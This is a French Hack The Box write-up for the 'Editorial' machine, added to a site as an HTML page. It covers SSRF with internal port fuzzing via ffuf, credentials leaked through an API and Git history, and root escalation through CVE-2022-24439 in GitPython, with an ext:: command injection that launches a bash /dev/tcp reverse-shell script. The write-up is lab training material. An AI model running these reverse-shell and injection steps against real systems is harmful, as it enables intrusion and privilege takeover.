@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Platforme: Hack The Box Lien: Editorial Niveau: Facile OS: Linux Editorial est une machine Linux assez simple, mais qui présente quelques particularités. L&amp;rsquo;application web est vulnérable au Server-Side Request Forgery (SSRF), mais elle nécessite un fuzzing des ports internes pour découvrir des données sensibles. En exploitant un point de terminaison API, nous récupérons des identifiants qui nous donnent un accès initial au système. Au cours d&amp;rsquo;une énumération plus poussée, nous découvrons une série de commits Git, dont l&amp;rsquo;un expose les informations d&amp;rsquo;identification d&amp;rsquo;un autre utilisateur, ce qui permet un déplacement latéral." />
+<meta name="keywords" content="technology, programming, tutorials, cybersecurity, software engineering, machine learning, hands-on projects, writeups, Hack The Box" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://scorpiosec.com/fr/posts/2024/10/htb-editorial/" />
+
+
+    <title>
+        
+            HTB: Editorial
+        
+    </title>
+
+
+
+
+
+
+<link rel="stylesheet" href="https://scorpiosec.com/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://scorpiosec.com/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://scorpiosec.com/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://scorpiosec.com/favicon-16x16.png">
+    <link rel="manifest" href="https://scorpiosec.com/site.webmanifest">
+    <link rel="mask-icon" href="https://scorpiosec.com/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://scorpiosec.com/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="HTB: Editorial">
+<meta itemprop="description" content="Platforme: Hack The Box Lien: Editorial Niveau: Facile OS: Linux Editorial est une machine Linux assez simple, mais qui présente quelques particularités. L&rsquo;application web est vulnérable au Server-Side Request Forgery (SSRF), mais elle nécessite un fuzzing des ports internes pour découvrir des données sensibles. En exploitant un point de terminaison API, nous récupérons des identifiants qui nous donnent un accès initial au système. Au cours d&rsquo;une énumération plus poussée, nous découvrons une série de commits Git, dont l&rsquo;un expose les informations d&rsquo;identification d&rsquo;un autre utilisateur, ce qui permet un déplacement latéral."><meta itemprop="datePublished" content="2024-10-16T21:00:55-05:00" />
+<meta itemprop="dateModified" content="2024-10-16T21:00:55-05:00" />
+<meta itemprop="wordCount" content="1199"><meta itemprop="image" content="https://scorpiosec.com/images/HTB-Editorial/Editorial.png" />
+<meta itemprop="keywords" content="Hack The Box," />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scorpiosec.com/images/HTB-Editorial/Editorial.png" /><meta name="twitter:title" content="HTB: Editorial"/>
+<meta name="twitter:description" content="Platforme: Hack The Box Lien: Editorial Niveau: Facile OS: Linux Editorial est une machine Linux assez simple, mais qui présente quelques particularités. L&rsquo;application web est vulnérable au Server-Side Request Forgery (SSRF), mais elle nécessite un fuzzing des ports internes pour découvrir des données sensibles. En exploitant un point de terminaison API, nous récupérons des identifiants qui nous donnent un accès initial au système. Au cours d&rsquo;une énumération plus poussée, nous découvrons une série de commits Git, dont l&rsquo;un expose les informations d&rsquo;identification d&rsquo;un autre utilisateur, ce qui permet un déplacement latéral."/>
+
+
+
+    <meta property="og:title" content="HTB: Editorial" />
+<meta property="og:description" content="Platforme: Hack The Box Lien: Editorial Niveau: Facile OS: Linux Editorial est une machine Linux assez simple, mais qui présente quelques particularités. L&rsquo;application web est vulnérable au Server-Side Request Forgery (SSRF), mais elle nécessite un fuzzing des ports internes pour découvrir des données sensibles. En exploitant un point de terminaison API, nous récupérons des identifiants qui nous donnent un accès initial au système. Au cours d&rsquo;une énumération plus poussée, nous découvrons une série de commits Git, dont l&rsquo;un expose les informations d&rsquo;identification d&rsquo;un autre utilisateur, ce qui permet un déplacement latéral." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://scorpiosec.com/fr/posts/2024/10/htb-editorial/" /><meta property="og:image" content="https://scorpiosec.com/images/HTB-Editorial/Editorial.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-10-16T21:00:55-05:00" />
+<meta property="article:modified_time" content="2024-10-16T21:00:55-05:00" />
+
+
+
+
+
+    <meta property="article:section" content="Writeups" />
+
+
+
+    <meta property="article:published_time" content="2024-10-16 21:00:55 -0500 CDT" />
+
+
+
+
+
+
+
+
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-662ME9PQBT"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-662ME9PQBT', { 'anonymize_ip': false });
+}
+</script>
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://scorpiosec.com/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text ">
+                Scorpiosec:~$</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://scorpiosec.com/fr/about/">À propos</a></li><li><a href="https://scorpiosec.com/fr/posts/">Postes</a></li><li><a href="https://scorpiosec.com/fr/projects/">Projets</a></li><li><a href="https://scorpiosec.com/fr/tags/">Tags</a></li><li><a href="https://scorpiosec.com/fr/categories/">Categories</a></li>
+        <div class="submenu">
+            <li class="dropdown">
+                <a href="javascript:void(0)" class="dropbtn">fr</a>
+                <div class="dropdown-content">
+                    
+                        
+                            <a title="en" href="https://scorpiosec.com/posts/2024/10/htb-editorial/">en</a>
+                        
+                    
+                </div>
+            </li>
+        </div>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        6 minutes
+
+         | Aussi disponible en
+          
+              <a href="https://scorpiosec.com/posts/2024/10/htb-editorial/"><span class="flag fi fi-gb"></span></a>
+          
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://scorpiosec.com/fr/posts/2024/10/htb-editorial/">HTB: Editorial</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Table des matières</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#balayage">Balayage</a></li>
+    <li><a href="#enumération">Enumération</a></li>
+    <li><a href="#accès-initial">Accès initial</a>
+      <ul>
+        <li><a href="#mouvement-latéral-shell-en-tant-que-prod">Mouvement latéral (Shell en tant que prod)</a></li>
+      </ul>
+    </li>
+    <li><a href="#elévation-de-privilèges">Elévation de Privilèges</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        <ul>
+<li>Platforme: Hack The Box</li>
+<li>Lien: <a href="https://app.hackthebox.com/machines/Editorial" target="_blank" >Editorial</a>
+
+</li>
+<li>Niveau: Facile</li>
+<li>OS: Linux</li>
+</ul>
+<hr>
+<p>Editorial est une machine Linux assez simple, mais qui présente quelques particularités. L&rsquo;application web est vulnérable au Server-Side Request Forgery (SSRF), mais elle nécessite un fuzzing des ports internes pour découvrir des données sensibles. En exploitant un point de terminaison API, nous récupérons des identifiants qui nous donnent un accès initial au système. Au cours d&rsquo;une énumération plus poussée, nous découvrons une série de commits Git, dont l&rsquo;un expose les informations d&rsquo;identification d&rsquo;un autre utilisateur, ce qui permet un déplacement latéral. L&rsquo;escalade des privilèges est réalisée en exploitant le CVE-2022-24439 en combinaison avec un script exécutable en tant que root.</p>
+<p>Addresse IP cible - <code>10.10.11.20</code></p>
+<h2 id="balayage">Balayage</h2>
+<pre tabindex="0"><code>./nmap_scan.sh 10.10.11.20 Editorial
+</code></pre><p><strong>Resultats</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Running detailed scan on open ports: 22,80
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-10-16 21:07 CDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.20
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.052s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://editorial.htb
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 9.14 seconds
+</span></span></code></pre></div><p>Nmap trouve deux ports ouverts, 22 (SSH) et 80 (HTTP), de plus il y a une redirection vers <code>editorial.htb</code>.</p>
+<pre tabindex="0"><code>sudo echo &#34;10.10.11.20 editorial.htb&#34; | sudo tee -a /etc/hosts
+</code></pre><h2 id="enumération">Enumération</h2>
+<p>Sur <code>http://editorial.htb</code>, nous trouvons le site web d&rsquo;une maison d&rsquo;édition.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/Editorial_website.png" alt="Editorial website"></p>
+<p>En cliquant sur <code>Publish with Us</code>, nous accédons à <code>http://editorial.htb/upload</code>, où nous pouvons soit envoyer un lien, soit télécharger un fichier.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/editorial_upload_feature.png" alt="Editorial Publish with Us page"></p>
+<p>Puisque l&rsquo;application accepte une url fournie par l&rsquo;utilisateur, testons le SSRF. Une fois le formulaire rempli, nous capturons la requête obtenue après avoir cliqué sur le bouton <code>Preview</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/Upload_Cover_Req.png" alt="Editorial upload-cover request"></p>
+<p>Nous envoyons la requête et obtenons une réponse valide (<strong>Status Code 200OK</strong>), le header du serveur (<strong>nginx/1.18.0 (Ubuntu)</strong>), et un contenu à <code>/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</code> provenant très probablement d&rsquo;une application interne. Cela signifie que le SSRF fonctionne, car l&rsquo;application récupère et renvoie le contenu du service interne à <code>127.0.0.1:80</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/Upload_Cover_response.png" alt="Editorial upload-cover request response"></p>
+<p>Un autre test consisterait à utiliser notre propre adresse IP avec un numéro de port de notre choix, nous aurons également un listener qui écoutera sur ce même port.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/SSRF_test.png" alt="SSRF test on local Kali"></p>
+<p>Sur le listener, nous recevons une réponse qui confirme également la présence du SSRF.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/SSRF_nc_connection.png" alt="SSRF local test nc response"></p>
+<p>En examinant le contenu de la réponse avec <code>http://editorial.htb/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg</code>, nous observons une image banale.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/response_content.png" alt="Editorial SSRF response content"></p>
+<p>Nous sommes sur la bonne voie, mais il nous manque un élément. La plupart du temps, les applications internes fonctionnent sur un port différent qui n&rsquo;est pas exposé au public. Afin de trouver le bon port, nous effectuerons un peu de fuzzing.</p>
+<p>J&rsquo;utilise la requête que nous avons interceptée avec Burp plus tôt, je la formate autant que possible et je supprime les headers redondants.</p>
+<p>En l&rsquo;utilisant avec ffuf, nous trouvons le port <code>5000</code>.</p>
+<blockquote>
+<p>Cette opération peut être répliquée avec la fonction Intruder de Burp, mais gardez à l&rsquo;esprit que la version gratuite limite cette fonction, donc fuzzer tous les ports vous prendrait beaucoup de temps! Ffuf le fait en moins de 4 minutes, ce qui nous fait gagner beaucoup de temps.</p>
+</blockquote>
+<pre tabindex="0"><code>ffuf -u &#39;http://editorial.htb/upload-cover&#39; \
+-d $&#39;-----------------------------29074654981783001802154691355\r\nContent-Disposition: form-data; name=&#34;bookurl&#34;\r\n\r\nhttp://127.0.0.1:FUZZ/\r\n-----------------------------29074654981783001802154691355\r\nContent-Disposition: form-data; name=&#34;bookfile&#34;; filename=&#34;&#34;\r\nContent-Type: application/octet-stream\r\n\r\n\r\n-----------------------------29074654981783001802154691355--&#39; \
+-w &lt;(seq 1 65535) \
+-H &#39;Content-Type: multipart/form-data; boundary=---------------------------29074654981783001802154691355&#39; \
+-H &#39;Host: editorial.htb&#39; \
+-t 100 \
+-mc all \
+-fs 61
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Editorial/SSRF_ffuf_Fuzzing.png" alt="SSRF ffuf internal port fuzzing"></p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-u</td>
+<td>Spécifie l&rsquo;URL cible</td>
+</tr>
+<tr>
+<td>-d $</td>
+<td>Spécifie le corps de la requête HTTP</td>
+</tr>
+<tr>
+<td>-w</td>
+<td>Wordlist (nous utilisons une liste générée de manière dynamique pour tous les numéros de port)</td>
+</tr>
+<tr>
+<td>FUZZ</td>
+<td>Ce texte sera remplacé par chaque nombre au cours du processus de fuzzing</td>
+</tr>
+<tr>
+<td>-H</td>
+<td>Spécifie l&rsquo;en-tête HTTP</td>
+</tr>
+<tr>
+<td>-t 100</td>
+<td>Définit le nombre de threads simultanés</td>
+</tr>
+<tr>
+<td>-mc</td>
+<td>Spécifie le code d&rsquo;état de la réponse HTTP à filtrer</td>
+</tr>
+<tr>
+<td>all</td>
+<td>Si elle est utilisée, ffuf ne filtrera pas les réponses sur la base des codes d&rsquo;état et affichera toutes les réponses</td>
+</tr>
+<tr>
+<td>-fs 61</td>
+<td>Filtre en fonction de la taille de la réponse. Ici, les réponses dont la taille du corps est de 61 octets seront filtrées</td>
+</tr>
+</tbody>
+</table>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/internal_port_5000_found.png" alt="SSRF Internal port 5000 found"></p>
+<h2 id="accès-initial">Accès initial</h2>
+<p>Maintenant, nous renvoyons la requête avec <code>http://127.0.0.1:5000</code> et obtenons un répertoire différent (<code>uploads</code>).</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/SSRF_internal_port_number.png" alt="SSRF Internal port number request"></p>
+<p>Lorsque nous allons sur <code>http://editorial.htb/static/uploads/e9ed8f81-925d-40e0-945e-7fcb30899573</code>, un fichier est automatiquement téléchargé sur notre machine.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/File_Downloaded.png" alt="SSRF File Downloaded"></p>
+<p>Il contient des données JSON.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/JSON_data_ugly.png" alt="JSON Data ugly"></p>
+<p>Avec <code>jq</code> nous pouvons le rendre plus lisible.</p>
+<pre tabindex="0"><code>cat e9ed8f81-925d-40e0-945e-7fcb30899573 | jq
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Editorial/JSON_data_pretty.png" alt="JSON Data pretty"></p>
+<p>Il s&rsquo;agit d&rsquo;une liste de points d&rsquo;accès à l&rsquo;API.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JSON" data-lang="JSON"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;messages&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;promotions&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve a list of all the promotions in our library.&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/messages/promos&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;coupons&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve the list of coupons to use in our library.&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/messages/coupons&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;new_authors&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve the welcome message sended to our new authors.&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/messages/authors&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;platform_use&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve examples of how to use the platform.&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/messages/how_to_use_platform&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ],
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;version&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;changelog&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve a list of all the versions and updates of the api.&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata/changelog&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;latest&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Retrieve the last version of api.&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;endpoint&#34;</span>: <span style="color:#e6db74">&#34;/api/latest/metadata&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;methods&#34;</span>: <span style="color:#e6db74">&#34;GET&#34;</span>
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Après les avoir testés, la réponse que nous obtenons avec <code>http://127.0.0.1:5000/api/latest/metadata/messages/authors</code> déclenche un autre téléchargement de fichier à <code>http://editorial.htb/static/uploads/c1c51caa-8a20-4f95-aca1-3a55e0a0fb69</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/message_authors_api_endpoint.png" alt="message authors api endpoint"></p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/message_authors_file.png" alt="message authors api endpoint file downloaded"></p>
+<p>Il s&rsquo;agit d&rsquo;un message de bienvenue pour un auteur avec ses identifiants, <code>dev:dev080217_devAPI!@</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/dev_credentials.png" alt="dev credentials"></p>
+<p>En utilisant ces identifiants, nous nous connectons via SSH et récupérons le drapeau utilisateur.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/user_flag_editorial.png" alt="dev shell and user flag"></p>
+<h3 id="mouvement-latéral-shell-en-tant-que-prod">Mouvement latéral (Shell en tant que prod)</h3>
+<p>Dans <code>/home/dev/apps</code> nous trouvons un répertoire <code>.git</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/git-file.png" alt=".git file"></p>
+<p>L&rsquo;exécution de <code>git log</code> à l&rsquo;intérieur de ce dernier permet d&rsquo;obtenir une liste de commits.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/git_log.png" alt="git log command"></p>
+<p>Après avoir utilisé <code>git show</code> sur le troisième commit en partant du haut, nous trouvons d&rsquo;autres informations d&rsquo;identification, <code>prod:080217_Producti0n_2023!@</code>.</p>
+<pre tabindex="0"><code>git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Editorial/prod_creds.png" alt="prod user credentials"></p>
+<p>Avec ces derniers, nous obtenons un autre shell SSH sous le nom de <code>prod</code>, le répertoire personnel de cet utilisateur ne contient rien de spécial.</p>
+<p>Cependant, il est autorisé à exécuter la commande <code>/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py</code> avec n&rsquo;importe quel argument (<code>*</code>) en tant qu&rsquo;utilisateur root.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/sudo-l_cmd.png" alt="sudo -l command"></p>
+<p>Examinons le contenu de <code>/opt/internal_apps/clone_changes/clone_prod_change.py</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/clone_prod_change_script.png" alt="clone_prod_change python script"></p>
+<p>Ce script clone un répertoire Git dans un répertoire spécifique (<code>/opt/internal_apps/clone_changes</code>). L&rsquo;option <code>multi_options=[&quot;-c protocol.ext.allow=always&quot;]</code> permet au protocole <code>ext::</code> d&rsquo;être utilisé pour le clonage.</p>
+<h2 id="elévation-de-privilèges">Elévation de Privilèges</h2>
+<p>En utilisant <code>pip3 list</code> nous trouvons la liste de tous les paquets Python installés sur le système. <code>GitPython</code> se démarque immédiatement, il utilise la version <code>3.1.29</code>.</p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/python_pkg_list.png" alt="installed python packages list"></p>
+<p>Des recherches sur les vulnérabilités de cette version nous permettent de trouver le <a href="https://github.com/PyCQA/bandit/issues/971" target="_blank" >CVE-2022-24439</a>
+
+ avec un PoC <a href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858" target="_blank" >ici</a>
+
+.</p>
+<p>Le code exploite le protocole <code>ext::</code> de Git qui permet aux utilisateurs de passer des commandes externes au lieu des protocoles standards tels que <code>https</code> et <code>ssh</code>, ce qui permet de réaliser une injection de commande.</p>
+<p>Utilisons un script bash afin d&rsquo;obtenir un shell inversé en tant que <code>root</code>.</p>
+<p>Nous créons <code>revshell.sh</code> et le rendons exécutable avec <code>chmod +x revshell.sh</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>IP<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;YOUR_IP&#34;</span>  
+</span></span><span style="display:flex;"><span>PORT<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PORT_NUMBER&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/bin/bash -i &gt;&amp; /dev/tcp/$IP/$PORT 0&gt;&amp;<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Ensuite, nous exécutons la commande ci-dessous pour obtenir un shell root sur notre listener, ce qui nous permet de lire le drapeau root dans <code>/root</code>.</p>
+<pre tabindex="0"><code>sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py &#39;ext::/tmp/revshell.sh&#39;
+</code></pre><p><img src="https://scorpiosec.com/images/HTB-Editorial/git_script_ext.png" alt="Reverse shell trigger"></p>
+<p><img src="https://scorpiosec.com/images/HTB-Editorial/root_flag_editorial.png" alt="Editorial root flag"></p>
+<p>Ce défi était assez simple, du moment que vous étiez minutieux dans votre énumération. Merci d&rsquo;avoir pris le temps de lire cet article et portez vous bien!</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/fr/tags/hack-the-box/">Hack The Box</a></span>
+        
+    </p>
+
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://scorpiosec.com/fr/categories/writeups/">Writeups</a></span>
+        
+    </p>
+
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1199 Mots
+      </p>
+
+      <p>
